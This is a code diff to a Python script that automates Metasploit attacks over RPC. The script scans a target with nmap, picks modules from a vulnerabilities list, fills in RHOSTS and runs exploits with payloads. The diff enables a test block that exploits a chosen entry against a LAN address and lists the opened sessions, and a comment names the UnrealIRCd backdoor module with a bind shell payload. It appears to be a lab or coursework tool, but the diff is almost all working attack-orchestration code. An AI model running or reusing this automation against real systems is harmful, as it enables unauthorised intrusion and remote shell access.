@@ -28,31 +28,32 @@ if __name__ == "__main__":
 
     ######### TEST YOUR VULNERABILITY HERE (change the number below to the index of your exploit in the vulnerabilities list)
     # Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
-    # vulnerability = vulnerabilities[1]
-    # print(vulnerability.description)
-    # print(vulnerability.module)
-    # RHOSTS = "192.168.119.129" # PUT YOUR HOST HERE
-    # module = vulnerability.module
-    # exploit = client.modules.use('exploit', module)
-    # # options = exploit.options
-    # missingOptions = exploit.missing_required
-    # if 'RHOSTS' in missingOptions:
-    #     print(RHOSTS)
-    #     exploit['RHOSTS'] = RHOSTS
-    # print("missing options:", exploit.missing_required)
-    # if vulnerability.payload:
-    #     print("payload:", vulnerability.payload)
-    #     exploit.execute(payload=vulnerability.payload)
-    # else:
-    #     print("no payload")
-    #     exploit.execute()
-    # time.sleep(vulnerability.sleep)
-    # print(client.sessions.list)
-    # exit()
+    vulnerability = vulnerabilities[3]
+    print(vulnerability.description)
+    print(vulnerability.module)
+    RHOSTS = "192.168.1.162" # PUT YOUR HOST HERE
+    module = vulnerability.module
+    exploit = client.modules.use(vulnerability.exploitType, module)
+    print(exploit)
+    # options = exploit.options
+    missingOptions = exploit.missing_required
+    if 'RHOSTS' in missingOptions:
+        print(RHOSTS)
+        exploit['RHOSTS'] = RHOSTS
+    print("missing options:", exploit.missing_required)
+    if vulnerability.payload:
+        print("payload:", vulnerability.payload)
+        exploit.execute(payload=vulnerability.payload)
+    else:
+        print("no payload")
+        exploit.execute()
+    time.sleep(vulnerability.sleep)
+    print(client.sessions.list)
+    exit()
     ######### TEST
 
     ######## RECONAISSANCE PHASE ########
-    RHOSTS = "192.168.119.129"
+    RHOSTS = "192.168.1.162"
     nmapAggressiveness = 2
     # in order of increasing levels of fucking around (and also in increasing levels of finding out)
     nmapPossibleArgs = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
@@ -86,13 +87,13 @@ if __name__ == "__main__":
                 print("*********", vulnerability.description, "EXPLOIT FOUND *********")
 
     ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
-    # exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')
+    # exploit = client.modules.use(vulnerability.exploitType, 'unix/irc/unreal_ircd_3281_backdoor')
     # exploit['RHOSTS'] = RHOSTS
     # payload = client.modules.use('payload', 'cmd/unix/bind_ruby')
     # exploit.execute(payload='cmd/unix/bind_ruby')
     for vulnerability in vulnerabilitiesToUse:
         module = vulnerability.module
-        exploit = client.modules.use('exploit', module)
+        exploit = client.modules.use(vulnerability.exploitType, module)
         # options = exploit.options
         missingOptions = exploit.missing_required
         print("######## EXPLOITING", vulnerability.description, "########")
